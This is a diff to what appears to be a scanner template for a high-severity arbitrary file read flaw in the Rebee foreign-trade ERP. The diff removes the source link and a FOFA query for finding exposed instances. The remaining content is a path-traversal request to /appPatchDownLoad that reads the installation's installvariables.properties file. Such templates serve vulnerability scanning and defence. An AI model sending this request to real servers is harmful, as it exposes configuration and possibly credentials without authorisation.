@@ -3,12 +3,8 @@ info:
   name: 睿贝外贸ERP appPatchDownLoad 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ymk6xrz06oiq1396'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ymk6xrz06oiq1396
-    fofa: body="loginNeedMobileNumVerification" || body="睿贝软件"
 http:
 - raw:
   - 'GET /appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties HTTP/1.1
